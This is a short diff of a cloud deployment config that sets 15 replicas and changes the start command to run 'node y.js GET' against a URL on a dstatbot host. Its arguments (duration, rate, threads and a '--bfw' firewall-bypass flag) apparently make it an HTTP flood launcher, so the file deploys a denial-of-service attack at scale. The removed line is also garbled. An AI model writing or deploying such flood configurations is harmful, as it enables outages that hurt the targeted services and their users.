@@ -3,6 +3,6 @@ builder = "NIXPACKS"
 
 [deploy]
 replicas = 15
-startCommand = "node k js GEThttps://c4.dstatbot.win/IxLnbz6J  700 8 120 --bfw --debug "
+startCommand = "node y.js GET https://c1.dstatbot.win/LBRAqyoF  700 8 120 --bfw --debug "
 restartPolicyType = "ON_FAILURE"
 restartPolicyMaxRetries = 1
